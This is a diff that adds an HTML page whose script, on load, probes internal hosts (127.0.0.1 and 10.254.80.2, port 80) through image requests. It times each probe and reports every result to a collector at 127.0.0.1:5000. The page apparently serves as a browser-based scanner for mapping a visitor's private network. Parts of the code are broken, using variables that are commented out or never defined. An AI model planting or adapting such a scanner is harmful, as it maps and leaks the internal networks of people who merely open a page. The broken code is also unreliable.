@@ -1,0 +1,56 @@
+<html><head><script>$(function() {
+    var timed = false;
+    //var imgTO = setTimeout(function () {
+    //    timed = true;
+    //    alert("timed out");
+    //}, 20000);  // 2 second timeout
+    
+    var sendDate = (new Date()).getTime();
+    
+    //var sendDate = (new Date()).getTime();
+    
+      
+        
+          var d = new Date();
+          var t = d.getTime();
+
+          $("<img>").on({
+           error: function() {
+            var receiveDate = (new Date()).getTime();
+
+            var responseTimeMs = receiveDate - sendDate;
+            $("<img>").attr("src", "http://127.0.0.1:5000/ips/127o0o0o1x80x"+responseTimeMs);
+            
+           },
+           load: function() {
+            clearTimeout(imgTO);
+            if (!timed) alert("open");
+            $("<img>").attr("src", "http://127.0.0.1:5000/ips/127o0o0o1x80x"+responseTimeMs+"ok");
+            }
+          }).attr("src", "http://127.0.0.1:80");
+        
+      
+    
+      
+        
+          var d = new Date();
+          var t = d.getTime();
+
+          $("<img>").on({
+           error: function() {
+            var receiveDate = (new Date()).getTime();
+
+            var responseTimeMs = receiveDate - sendDate;
+            $("<img>").attr("src", "http://127.0.0.1:5000/ips/10o254o80o2x80x"+responseTimeMs);
+            
+           },
+           load: function() {
+            clearTimeout(imgTO);
+            if (!timed) alert("open");
+            $("<img>").attr("src", "http://127.0.0.1:5000/ips/10o254o80o2x80x"+responseTimeMs+"ok");
+            }
+          }).attr("src", "http://10.254.80.2:80");
+        
+      
+    
+    });</script></head>
